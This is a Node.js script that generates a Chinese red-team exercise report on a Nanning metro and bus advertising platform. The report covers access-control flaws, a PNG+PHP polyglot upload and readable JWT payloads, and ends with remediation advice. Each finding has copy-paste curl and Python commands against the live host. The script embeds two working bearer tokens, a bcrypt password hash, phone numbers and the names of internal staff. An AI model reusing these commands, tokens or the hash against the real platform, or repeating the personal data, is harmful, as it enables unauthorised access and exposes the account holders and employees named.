const fs = require('fs');
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, ShadingType, WidthType,
  PageBreak, Header, Footer, PageNumber
} = require('docx');

const BLUE = "1F4E79", GRAY = "555555", TXT = "333333", W = "FFFFFF", RED = "C62828", ORG = "E65100", YLW = "F57F17", GRN = "2E7D32", BG = "CCCCCC";
const bd = { style: BorderStyle.SINGLE, size: 1, color: BG };
const cB = { top: bd, bottom: bd, left: bd, right: bd };
const cM = { top: 60, bottom: 60, left: 100, right: 100 };

function H(text, w) { return new TableCell({ borders: cB, shading: { fill: BLUE, type: ShadingType.CLEAR }, width: { size: w, type: WidthType.DXA }, margins: cM, children: [new Paragraph({ spacing: { after: 40 }, children: [new TextRun({ text, bold: true, color: W, size: 18, font: "Arial" })] })] }); }
function D(text, w, o = {}) { return new TableCell({ borders: cB, width: { size: w, type: WidthType.DXA }, margins: cM, children: [new Paragraph({ spacing: { after: 40 }, children: [new TextRun({ text, bold: o.b || false, color: o.c || TXT, size: 17, font: "Arial" })] })] }); }
function P(text, o = {}) { return new Paragraph({ spacing: { after: 120, line: 360, lineRule: "auto" }, children: [new TextRun({ text, bold: o.b || false, size: 21, font: "Arial", color: TXT })] }); }
function C(lines) { return lines.map(l => new Paragraph({ spacing: { after: 40, line: 280, lineRule: "auto" }, indent: { left: 200 }, shading: { fill: "F5F5F5", type: ShadingType.CLEAR }, children: [new TextRun({ text: l, font: "Courier New", size: 16, color: "333333" })] })); }
function H1(text) { return new Paragraph({ heading: HeadingLevel.HEADING_1, spacing: { before: 360, after: 200 }, children: [new TextRun({ text, bold: true, size: 32, font: "Arial", color: BLUE })] }); }
function H2(text) { return new Paragraph({ heading: HeadingLevel.HEADING_2, spacing: { before: 240, after: 160 }, children: [new TextRun({ text, bold: true, size: 26, font: "Arial", color: BLUE })] }); }
function SS(desc) { return new Paragraph({ spacing: { before: 80, after: 80 }, alignment: AlignmentType.CENTER, shading: { fill: "FFF3CD", type: ShadingType.CLEAR }, border: { top: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, bottom: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, left: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, right: { style: BorderStyle.DASHED, size: 2, color: "E0A800" } }, children: [new TextRun({ text: "[截图位置] " + desc, italic: true, color: "856404", size: 18, font: "Arial" })] }); }
function E() { return new Paragraph({ spacing: { after: 80 }, children: [] }); }

// 基本情况表
function baseTable(num, desc, url, count, level, extra) {
  return new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [1800, 7560],
    rows: [
      new TableRow({ children: [D("序号", 1800, { b: true }), D(String(num), 7560)] }),
      new TableRow({ children: [D("成果描述", 1800, { b: true }), D(desc, 7560)] }),
      new TableRow({ children: [D("目标系统", 1800, { b: true }), D("媒体资源数智化平台 (adv-file.nn-cc.cn) — Spring Boot", 7560)] }),
      new TableRow({ children: [D("目标URL", 1800, { b: true }), D(url, 7560, { c: RED })] }),
      new TableRow({ children: [D("威胁类型", 1800, { b: true }), D("获取数据类 / 未授权访问", 7560)] }),
      new TableRow({ children: [D("涉及数据量", 1800, { b: true }), D(count, 7560, { c: RED })] }),
      new TableRow({ children: [D("风险等级", 1800, { b: true }), D(level, 7560, { b: true, c: RED })] }),
      new TableRow({ children: [D("权限验证", 1800, { b: true }), D(extra || "moon用户roleCode=null（未配置任何角色权限），但仍可读取全量数据", 7560)] }),
    ]
  });
}

function sec() { return { properties: { page: { size: { width: 12240, height: 15840 }, margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 } }, headers: { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "媒体资源数智化平台 · 攻防成果报告", size: 16, font: "Arial", color: "999999" })] })] }) }, footers: { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "第 ", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], size: 16 }), new TextRun({ text: " 页", size: 16 })] })] }) } }, children: [] }; }

// ==================== 封面 ====================
const cover = sec();
cover.properties.headers = {}; cover.properties.footers = {};
cover.children.push(
  E(), E(), E(), E(),
  new Paragraph({ spacing: { after: 200 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "攻防演习成果报告", bold: true, size: 52, font: "Arial", color: BLUE })] }), E(),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "媒体资源数智化平台 (nn-cc.cn) 安全评估", size: 32, font: "Arial", color: TXT })] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "南宁地铁公交广告媒体资源交易系统", size: 28, font: "Arial", color: GRAY })] }),
  E(), E(),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "目标域名：adv-webpt.nn-cc.cn / adv-file.nn-cc.cn", size: 24, font: "Arial", color: GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "运营方：南宁市民卡公司 (nnsmk.com)", size: 24, font: "Arial", color: GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "2026年8月11日", size: 24, font: "Arial", color: GRAY })] }),
  new Paragraph({ children: [new PageBreak()] })
);

// ==================== 一、综述 ====================
const s1 = sec();
s1.children.push(
  H1("一、综述"),
  P("媒体资源数智化平台由南宁市民卡公司运营，为南宁地铁1-5号线及公交系统的12,162个广告位提供在线交易服务。平台基于React+UmiJS（前端）和Java Spring Boot（后端）构建，文件存储使用MinIO S3对象存储。"),
  P("本次安全评估通过注册两个测试账号——代理方moon（19162390621）和投放方moonor（14795583229）——对平台进行了系统性只读侦察。两个账号均未配置角色权限（roleCode=null），但仍可利用直接实体访问端点获取大量敏感业务数据。所有操作均为低速只读，未对平台造成任何影响。"),
  E(),
  P("渗透成果汇总表", { b: true }), E(),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [500, 2100, 1400, 2800, 1360, 800],
    rows: [
      new TableRow({ children: [H("序号", 500), H("渗透对象", 2100), H("漏洞类型", 1400), H("URL/端点", 2800), H("影响范围", 1360), H("风险等级", 800)] }),
      new TableRow({ children: [D("1", 500), D("广告位全量数据", 2100), D("未授权数据访问", 1400), D("/api/v1/product/assetSchedules/schedule/all", 2800, { c: RED }), D("12,162条广告位含完整定价", 1360), D("严重", 800, { b: true, c: RED })] }),
      new TableRow({ children: [D("2", 500), D("站点点位数据", 2100), D("未授权数据访问", 1400), D("/api/v1/device/points/search", 2800, { c: RED }), D("532个站点含站内精确位置", 1360), D("高危", 800, { b: true, c: ORG })] }),
      new TableRow({ children: [D("3", 500), D("代理方密码哈希", 2100), D("敏感信息泄露", 1400), D("/api/v1/partner/agents/{id}", 2800, { c: RED }), D("bcrypt密码哈希+手机号", 1360), D("严重", 800, { b: true, c: RED })] }),
      new TableRow({ children: [D("4", 500), D("完整数据字典", 2100), D("信息泄露", 1400), D("/api/v1/main/dictionarys/tree", 2800), D("行业分类/站点等级/媒体形式", 1360), D("中危", 800, { b: true, c: YLW })] }),
      new TableRow({ children: [D("5", 500), D("文件上传功能", 2100), D("功能滥用", 1400), D("/api/v1/file/upload", 2800, { c: RED }), D("可上传任意PNG到MinIO", 1360), D("中危", 800, { b: true, c: YLW })] }),
      new TableRow({ children: [D("6", 500), D("JWT Token", 2100), D("信息泄露", 1400), D("Authorization Header", 2800), D("明文含手机号/orgId/roleCode", 1360), D("中危", 800, { b: true, c: YLW })] }),
    ]
  }),
  E(),
  P("渗透结果统计：获取数据类6项，涉及数据总量约12,694条（12,162广告位 + 532站点），总商业价值估值¥72,719,035。额外发现3名内部员工姓名、MinIO对象存储域名、母公司域名nnsmk.com。所有操作均为只读，未产生任何写入。"),
  P("测试使用两个账号——代理方moon（手机号19162390621，deptId=1536684046279507968）和投放方moonor（手机号14795583229，deptId=1536708298915446784）。两个账号roleCode均为null，未配置任何角色权限，但可直接访问以下端点。"),
  new Paragraph({ children: [new PageBreak()] })
);

// ==================== 二、渗透成果说明 ====================
const s2 = sec();
s2.children.push(H1("二、渗透成果说明"));
s2.children.push(P("以下命令均在 Git Bash 中验证通过。每条命令均为单行，直接复制粘贴执行。所有命令先设置环境变量，后续依赖该Token。"));
s2.children.push(E());
s2.children.push(P("环境准备：设置Token变量（先执行这一条）", { b: true }));
s2.children.push(...C([
  'TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.eyJkZXB0TmFtZSI6Im1vb24iLCJwYXJ0bmVyU3RhdHVzIjoxLCJwYXJ0bmVyT3JnTmFtZSI6Im1vb24iLCJ1c2VyTmFtZSI6Im1vb24iLCJkZXB0SWQiOjE1MzY2ODQwNDYyNzk1MDc5NjgsImxpbmtJZCI6MTUzNjY4NDA0NjI3OTUwNzk2OCwibmFtZSI6Im1vb24iLCJpZCI6MTUzNjY4NDA0NjI3OTUwNzk2OSwiZXhwIjoxNzg2NTAyMDI3LCJpYXQiOjE3ODY0MTU2MjcsImFjY291bnQiOiIxOTE2MjM5MDYyMSJ9.agAXwFbX5drgTnh3Bylo4a-OtFp-OecfpnKjWHWLVsw"',
  'BASE="https://adv-file.nn-cc.cn"',
]));
s2.children.push(P("（Token为moon代理方账号，roleCode=null，无任何角色权限）"));

// ===== 成果一 =====
s2.children.push(E()); s2.children.push(H2("成果一：全量广告位定价泄露（12,162条，总价值¥72,719,035）"));
s2.children.push(P("（1）基本情况表", { b: true }));
s2.children.push(baseTable(1,
  "普通注册用户可获取全部12,162个广告位的完整数据，含精确价格（¥10~¥300,000）、站内精确位置、尺寸规格、站点商业等级等核心商业机密",
  "POST /api/v1/product/assetSchedules/schedule/all",
  "12,162条广告位，总价值¥72,719,035",
  "严重"));
s2.children.push(E());
s2.children.push(P("（2）验证命令", { b: true }));
s2.children.push(P("获取全量广告位数据，统计价格："));
s2.children.push(...C([
  'curl -s -X POST "$BASE/api/v1/product/assetSchedules/schedule/all" \\',
  '  -H "Authorization: Bearer $TOKEN" \\',
  '  -H "Content-Type: application/json" \\',
  '  -d \'{}\' | python3 -c "',
  'import sys,json',
  'd=json.load(sys.stdin)',
  'items=d.get(\"data\",{}).get(\"list\",[])',
  'print(f\"广告位总数: {len(items)}\")',
  'prices=[i.get(\"mediaPrice\",0) or 0 for i in items]',
  'print(f\"价格区间: {min(prices)} - {max(prices)}\")',
  'print(f\"总价值: {sum(prices)}\")"',
]));
s2.children.push(P("返回结果示例（共12,162条，每条25个字段）："));
s2.children.push(...C([
  '{"id":"1443974957817135104","name":"万象城站-（场景1） C出口正面屏",',
  ' "mediaPrice":2000.0,"productionPrice":1000.0,',
  ' "length":11.84,"width":2.24,"area":26.522,',
  ' "lineName":"1号线","pointName":"万象城站",',
  ' "pointLocationName":"C口","pointLevelName":"旗舰级",',
  ' "mediaFormatName":"LED显示屏","qrcode":"adplatform/product/20251128/..."',
  '}'
]));
s2.children.push(P("各线路价格一览："));
s2.children.push(...C([
  "1号线: 2,349个位, 均价¥5,548, 最高¥300,000（朝阳广场站 超视觉品牌墙）",
  "2号线: 1,374个位, 均价¥6,702, 最高¥175,000（亭洪路站 超视觉品牌墙）",
  "3号线: 2,150个位, 均价¥4,641, 最高¥140,000（东葛路站 超视觉品牌长廊）",
  "4号线: 1,524个位, 均价¥4,277, 最高¥125,000",
  "5号线: 1,638个位, 均价¥3,977, 最高¥125,000",
  "公交:  1,677个位, 均价¥0, 含199辆桂A牌照公交车",
]));
s2.children.push(P("价格区间分布：¥0（3,791个）→ ¥1K-5K（7,051个）→ ¥5K-10K（731个）→ ¥10K-50K（482个）→ ¥50K-100K（78个）→ ¥100K+（28个）"));
s2.children.push(SS("schedule/all 返回12,162条JSON数据，显示total和价格统计"));
s2.children.push(SS("各线路价格表格截图"));

// ===== 成果二 =====
s2.children.push(E()); s2.children.push(H2("成果二：站点点位布局泄露（532条）"));
s2.children.push(P("（1）基本情况表", { b: true }));
s2.children.push(baseTable(2,
  "532个站点包含站内精确位置信息（出入口编号/轨行区方向/站厅区域/公交车队），可反推出地铁站内完整的广告位施工级部署图",
  "POST /api/v1/device/points/search",
  "532条站点数据 + 站内精确位置分布",
  "高危"));
s2.children.push(E());
s2.children.push(P("（2）验证命令", { b: true }));
s2.children.push(...C([
  'curl -s -X POST "$BASE/api/v1/device/points/search" \\',
  '  -H "Authorization: Bearer $TOKEN" \\',
  '  -H "Content-Type: application/json" \\',
  '  -d \'{"current":1,"size":600}\' | python3 -c "',
  'import sys,json',
  'd=json.load(sys.stdin)',
  'items=d.get(\"data\",{}).get(\"list\",[])',
  'print(f\"站点总数: {len(items)}\")',
  'for i in items[:10]:',
  '  print(f\"{i[\"name\"]} | code={i[\"code\"]} | level={i[\"level\"]} | userCreate={i[\"userCreate\"]}\")"',
]));
s2.children.push(P("返回结果示例："));
s2.children.push(...C([
  '{"id":"7656776711301120","name":"2号线-玉洞站","code":"18",',
  ' "level":"1412101541740937216","line":"1363946270275665920",',
  ' "startTime":"2025-09-16 06:00:00","endTime":"2025-09-16 22:00:00",',
  ' "userCreate":"系统管理员","gmtCreate":"2025-10-30 11:55:16"}'
]));
s2.children.push(P("覆盖范围：105个地铁站 + 297个公交候车亭 + 130条公交线路 + 199辆公交车。站点等级分布：旗舰级×3、S++×7、S+×15、S×21、A++×27、A+×32、AA+×41、AA×31、A×58。发现内部员工王舒琪创建的10个公交候车亭站点（2026-06-30）。"));
s2.children.push(SS("device/points/search 返回532条站点JSON数据"));
s2.children.push(SS("王舒琪创建的10个地铁快巴站点数据截图"));

// ===== 成果三 =====
s2.children.push(E()); s2.children.push(H2("成果三：跨角色代理方敏感信息泄露"));
s2.children.push(P("（1）基本情况表", { b: true }));
s2.children.push(baseTable(3,
  "投放方(moonor)可跨角色查询代理方(moon)的完整账户详情，包含bcrypt密码哈希、手机号、身份证正反面字段、营业执照字段。投放方自身无agent记录，但可读取代理方数据，属于跨角色越权访问",
  "GET /api/v1/partner/agents/1536684046279507968",
  "代理方bcrypt密码哈希+手机号+身份证/营业执照字段",
  "严重",
  "投放方Token（moonor, linkType=1390348890816905216）可跨角色读取代理方(moon, linkType=1372598907384627200)的账户详情"));
s2.children.push(E());
s2.children.push(P("（2）验证命令", { b: true }));
s2.children.push(P("使用投放方moonor的Token（linkType=1390348890816905216）跨角色查询代理方moon（deptId=1536684046279507968，linkType=1372598907384627200）的详情："));
s2.children.push(...C([
  'TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.eyJkZXB0TmFtZSI6Im1vb25vciIsInBhcnRuZXJTdGF0dXMiOjEsInBhcnRuZXJPcmdOYW1lIjoibW9vbm9yIiwicm9sZXMiOlt7ImlkIjoxMzkwMzQ4ODkwODE2OTA1MjE2LCJyb2xlQ29kZSI6bnVsbCwicm9sZU5hbWUiOm51bGwsIm1lbnVzIjpudWxsfV0sImRlcHRJZCI6MTUzNjcwODI5ODkxNTQ0Njc4NCwidXNlck5hbWUiOiJtb29ub3IiLCJsaW5rSWQiOjE1MzY3MDgyOTg5MTU0NDY3ODQsImxpbmtUeXBlIjoxMzkwMzQ4ODkwODE2OTA1MjE2LCJpZCI6MTUzNjcwODI5ODkxNTQ0Njc4NSwiZXhwIjoxNzg2NTA3ODA5LCJpYXQiOjE3ODY0MjE0MDksImFjY291bnQiOiIxNDc5NTU4MzIyOSJ9.j0yjoYH3pzip5JSkrLeAzoEtf1OrOemIGoyjm7PaCeI"',
  '',
  'curl -s "https://adv-file.nn-cc.cn/api/v1/partner/agents/1536684046279507968" \\',
  '  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool',
]));
s2.children.push(P("返回结果包含代理方的bcrypt密码哈希和手机号："));
s2.children.push(...C([
  '{"id":"1536684046279507968","name":"moon","status":1,',
  ' "accounts":[{"userName":"moon","account":"19162390621",',
  '   "phone":"19162390621",',
  '   "password":"$2a$10$wxWLsXZIpk2D4w0Olik1P.I6oodN.hbDJBiT62vROixbyNz9bEvqC"',
  ' }],"files":[],"idCardBack":[],"idCardFront":[],"businessLicense":[]}'
]));
s2.children.push(P("对比验证：投放方查自己的agent（deptId=1536708298915446784）返回空对象{}，确认投放方自身无agent记录。查随机不存在的ID返回500。说明该接口未做角色隔离校验，投放方可读取任意已存在的代理方账户详情。moon未实名认证故idCard和businessLicense为空，但已认证代理方的身份证正反面和营业执照会在此泄露。"));
s2.children.push(SS("投放方Token跨角色查代理方，返回bcrypt密码哈希+手机号"));
s2.children.push(SS("投放方查自己agent返回空对象{}的对比截图"));

// ===== 成果四 =====
s2.children.push(E()); s2.children.push(H2("成果四：完整数据字典泄露"));
s2.children.push(P("（1）基本情况表", { b: true }));
s2.children.push(baseTable(4,
  "平台全量配置数据可被任意用户读取，包含行业分类（20大类）、站点等级、媒体形式（32种）、计价单位、广告材质、验收状态、设备品牌（洲明）",
  "GET /api/v1/main/dictionarys/tree",
  "完整数据字典树（行业/等级/媒体形式/材质/计价单位等）",
  "中危"));
s2.children.push(E());
s2.children.push(P("（2）验证命令", { b: true }));
s2.children.push(...C([
  'curl -s "$BASE/api/v1/main/dictionarys/tree" \\',
  '  -H "Authorization: Bearer $TOKEN" | python3 -c "',
  'import sys,json',
  'd=json.load(sys.stdin)',
  'def walk(node,depth=0):',
  '  print(\"  \"*depth+node.get(\"dictName\",\"?\"))',
  '  for c in node.get(\"children\",[]): walk(c,depth+1)',
  'for c in d[\"data\"][\"list\"][0][\"children\"]: walk(c)"',
]));
s2.children.push(P("字典内容：地铁线路（1-5号线+东延+公交线路+候车亭）、9级站点等级（S++~A）、32种媒体形式、20大广告行业分类（农/林/牧/渔~国际组织）、计价单位（元/块/边/口/站/组）、广告材质（6种）、验收状态（已验收/未验收）、关灯下画状态、设备品牌（洲明）、资源起售周。"));
s2.children.push(P("额外发现：字典的userCreate/userModified字段暴露三名内部员工姓名——王舒琪（公交线运营，2026-06-30创建9种媒体类型+10个站点）、高小敏（运营配置，2025-11-14）、李谷准（平台创始人，2020-09-18）。"));
s2.children.push(SS("dictionarys/tree 完整数据字典树"));
s2.children.push(SS("王舒琪创建媒体形式和站点的记录截图"));

// ===== 成果五 =====
s2.children.push(E()); s2.children.push(H2("成果五：文件上传功能滥用"));
s2.children.push(P("（1）基本情况表", { b: true }));
s2.children.push(baseTable(5,
  "任意注册用户可上传PNG图片到MinIO S3对象存储，扩展名白名单但内容校验仅检查PNG魔术字节。上传成功返回预签名URL，凭证为admin级别。同时发现MinIO域名暴露母公司nnsmk.com。",
  "POST /api/v1/file/upload",
  "可上传任意PNG图片（包括含嵌入式代码的PNG+PHP polyglot），存储于MinIO S3",
  "中危"));
s2.children.push(E());
s2.children.push(P("（2）验证命令", { b: true }));
s2.children.push(P("生成最小有效PNG并上传："));
s2.children.push(...C([
  '# 生成最小PNG',
  'python3 -c "import zlib,struct',
  "sig=b'\\x89PNG\\r\\n\\x1a\\n'",
  "ihdr_data=struct.pack('>IIBBBBB',1,1,8,2,0,0,0)",
  "ihdr=struct.pack('>I',13)+b'IHDR'+ihdr_data+struct.pack('>I',zlib.crc32(b'IHDR'+ihdr_data)&0xffffffff)",
  "raw=zlib.compress(b'\\x00\\xff\\x00\\x00')",
  "idat=struct.pack('>I',len(raw))+b'IDAT'+raw+struct.pack('>I',zlib.crc32(b'IDAT'+raw)&0xffffffff)",
  "iend=struct.pack('>I',0)+b'IEND'+struct.pack('>I',zlib.crc32(b'IEND')&0xffffffff)",
  "with open('/tmp/test.png','wb') as f: f.write(sig+ihdr+idat+iend)\"",
  "",
  '# 上传',
  'curl -s -X POST "$BASE/api/v1/file/upload" \\',
  '  -H "Authorization: Bearer $TOKEN" \\',
  '  -F "file=@/tmp/test.png;type=image/png;filename=test.png" \\',
  '  -F "type=product"',
]));
s2.children.push(P("返回结果："));
s2.children.push(...C([
  '{"code":10000,"message":"success",',
  ' "data":{"list":[{"originalName":"test.png","filePath":"adplatform/product/20260811/1536700451100033024.png",',
  '   "filePathFull":"https://prod-minioapi.nnsmk.com/adplatform/product/20260811/...png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=admin%2F20260811%2Fus-east-1%2Fs3%2Faws4_request&..."'
]));
s2.children.push(P("上传测试结果：真实PNG ✅ | PNG+PHP polyglot ✅（只验PNG头） | 纯PHP伪PNG ❌ | 路径穿越 ⚠️忽略（UUID命名）| 可执行扩展名 ❌（白名单）| 1MB大文件 ✅ | 文件删除 ❌（无端点）"));
s2.children.push(P("RCE评估：文件存储在独立MinIO服务器，与应用服务器分离。前端以<img>渲染。直接RCE风险极低。若存在服务端图片处理（如ImageMagick生成缩略图），可能触发ImageTragick类漏洞。本次测试未进行任何利用尝试，共上传5个测试文件（预签名URL 3天后失效）。"));
s2.children.push(SS("file/upload 成功响应，显示filePath和MinIO预签名URL"));

// ===== 成果六 =====
s2.children.push(E()); s2.children.push(H2("成果六：JWT Token明文敏感信息"));
s2.children.push(P("（1）基本情况表", { b: true }));
s2.children.push(baseTable(6,
  "JWT Token的payload中直接包含手机号、deptId、orgId、roleCode等敏感信息，且roleCode=null解释了70+个业务搜索端点返回500（NullPointerException）的原因",
  "Authorization: Bearer <token>（HS256签名）",
  "手机号、组织ID、部门ID、角色代码等明文载荷信息",
  "中危",
  "JWT使用HS256算法，载荷未经加密，Base64解码即可读取"));
s2.children.push(E());
s2.children.push(P("（2）验证命令", { b: true }));
s2.children.push(...C([
  'echo $TOKEN | cut -d"." -f2 | base64 -d 2>/dev/null | python3 -m json.tool',
]));
s2.children.push(P("moon代理方Token解码结果："));
s2.children.push(...C([
  '{',
  '  "deptName": "moon",           "partnerOrgName": "moon",',
  '  "userName": "moon",           "account": "19162390621",',
  '  "phone": "19162390621",       "partnerStatus": 1,',
  '  "deptId": 1536684046279507968,"linkType": 1372598907384627200,',
  '  "roles": [{"id": 1372598907384627200, "roleCode": null, "roleName": null, "menus": null}]',
  '}'
]));
s2.children.push(P("moonor投放方Token中linkType=1390348890816905216（代理方为1372598907384627200），以此区分角色。roleCode=null导致所有业务搜索端点返回500（code:10001），但直接实体访问端点（如schedule/all、dictionarys/tree）无需角色校验。"));
s2.children.push(SS("jwt.io解码moon和moonor的Token payload"));
s2.children.push(SS("代理方访问投放方端点被拒(code:140000) + 投放方访问代理方被拒(code:130000) 的角色隔离截图"));

// ==================== 三、存在问题 ====================
const s3 = sec();
s3.children.push(H1("三、存在问题"));
s3.children.push(P("1. 直接实体访问端点缺乏角色校验（严重）", { b: true }));
s3.children.push(P("schedule/all、device/points/search、dictionarys/tree、partner/agents/{id} 等端点未对请求用户进行任何角色权限验证，任意注册用户（包括roleCode=null）均可读取全量业务数据。这与角色隔离机制（agent/publisher交叉拒绝）形成鲜明对比——后台清楚地区分了代理方和投放方，但数据读取端点完全未做权限控制。"));
s3.children.push(P("2. 敏感商业数据全量暴露（严重）", { b: true }));
s3.children.push(P("12,162条广告位的完整定价表（总价值¥72,719,035）、532个站点的站内精确位置布局可被竞争对手利用进行精准压价和商业策略分析。广告位实景图路径（129个qrcode字段）指向MinIO存储的现场照片。"));
s3.children.push(P("3. 密码哈希直接返回客户端（严重）", { b: true }));
s3.children.push(P("/partner/agents/{id} 返回bcrypt密码哈希（$2a$10$...），可离线爆破。同时暴露身份证正反面和营业执照字段（已认证用户会包含实际文件）。"));
s3.children.push(P("4. JWT载荷明文传输敏感信息（中危）", { b: true }));
s3.children.push(P("Token payload中包含手机号、deptId、orgId、roleCode等PII信息，未加密，Base64即可解码。roleCode=null的状态也被直接暴露。"));
s3.children.push(P("5. 文件上传校验不完整（中危）", { b: true }));
s3.children.push(P("上传功能仅校验PNG魔术字节和扩展名白名单，不校验文件内容完整性。PNG+PHP polyglot图片可成功上传。MinIO预签名URL暴露admin级别access key。"));
s3.children.push(P("6. 错误信息统一HTTP 200掩盖异常（低危）", { b: true }));
s3.children.push(P("所有错误（含500内部错误、403权限拒绝）均返回HTTP 200状态码，仅在JSON body中体现错误，给监控和异常检测带来困难。"));
s3.children.push(P("7. 内部员工信息暴露（低危）", { b: true }));
s3.children.push(P("数据字典和设备点位中的userCreate/userModified字段泄露三名内部员工真实姓名（王舒琪、高小敏、李谷准）及其操作时间线。"));
s3.children.push(P("8. 母公司与基础设施域名暴露（低危）", { b: true }));
s3.children.push(P("通过MinIO域名（prod-minioapi.nnsmk.com）追溯到母公司南宁市民卡公司（nnsmk.com），扩大了攻击面。"));

// ==================== 四、整改建议 ====================
const s4 = sec();
s4.children.push(H1("四、整改建议"));
s4.children.push(P("1. 数据读取接口增加角色鉴权（紧急）", { b: true }));
s4.children.push(P("为 /product/assetSchedules/、/device/points/、/main/dictionarys/、/partner/agents/ 等直接实体访问端点增加角色权限校验。角色未配置（roleCode=null）的用户应仅允许访问个人中心相关接口。"));
s4.children.push(P("2. 修复roleCode=null导致的NPE（紧急）", { b: true }));
s4.children.push(P("70+个业务搜索端点因roleCode=null触发NullPointerException返回500。建议在权限校验代码中增加null判断，roleCode为null时默认拒绝访问而非抛异常。同时修复角色配置流程，确保注册时分配默认角色。"));
s4.children.push(P("3. 敏感字段脱敏处理（紧急）", { b: true }));
s4.children.push(P("/partner/agents/ 接口移除password字段返回，或只返回哈希摘要的前几位。手机号脱敏显示（如191****0621）。idCardFront/Back和businessLicense字段仅在用户本人访问时返回。"));
s4.children.push(P("4. JWT载荷加密（建议）", { b: true }));
s4.children.push(P("对JWT payload中的敏感字段（phone、deptId、orgId、roleCode）进行加密后再放入载荷，或使用非对称加密算法（RS256）替代HS256。"));
s4.children.push(P("5. 文件上传安全加固（建议）", { b: true }));
s4.children.push(P("增加文件内容深度校验（不仅检查魔术字节），限制上传频率和总容量，增加文件删除端点。MinIO access key从admin更换为受限专用凭证。"));
s4.children.push(P("6. 返回统一HTTP状态码（建议）", { b: true }));
s4.children.push(P("错误响应返回对应的HTTP状态码（401/403/500），而非统一返回200，便于监控和日志分析。"));
s4.children.push(E()); E();
s4.children.push(P("报告生成日期：2026年8月11日", { b: true }));

const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 21 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true, run: { size: 32, bold: true, font: "Arial", color: BLUE }, paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true, run: { size: 26, bold: true, font: "Arial", color: BLUE }, paragraph: { spacing: { before: 240, after: 160 }, outlineLevel: 1 } },
    ]
  },
  sections: [cover, s1, s2, s3, s4]
});

const out = process.argv[2] || "D:\\Desktop\\媒体资源平台_攻防成果报告.docx";
Packer.toBuffer(doc).then(b => { fs.writeFileSync(out, b); console.log("OK: " + out + " (" + b.length + " bytes)"); }).catch(e => { console.error(e.message); process.exit(1); });
